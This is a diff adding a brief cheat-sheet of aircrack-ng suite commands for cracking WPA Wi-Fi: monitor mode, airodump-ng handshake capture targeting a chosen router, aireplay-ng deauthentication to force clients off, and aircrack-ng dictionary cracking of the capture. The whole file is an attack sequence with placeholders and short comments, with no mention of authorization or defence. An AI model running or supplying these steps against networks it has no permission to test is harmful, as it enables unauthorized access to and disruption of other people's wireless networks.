@@ -1,0 +1,22 @@
+airmon-ng  //shows available cards
+
+airmon-ng start (interface) //turns on monitor mode
+
+/*Glitch in kali reuires that you run 
+	ifconfig (interface) down
+
+	//after you are done monitoring you will have to re-enable the interface with
+
+	ifconfig (interface) up
+
+	piping data from airodump-ng requires 2>&1 at the end of the pipe statment
+*/
+
+airodump-ng (monitor interface{mon0}) // starts scanning available networks
+
+airodump-ng -c [channel] --bssid [bssid] -w (location to store handshake) [monitor interface]
+
+
+aireplay-ng –0 2 –a (router bssid) –c (client bssid listed understation) mon0 // deauth command
+
+aircrack-ng –a2 –b (bssid of router) –w (location of dictionary)  (location of .cap file)
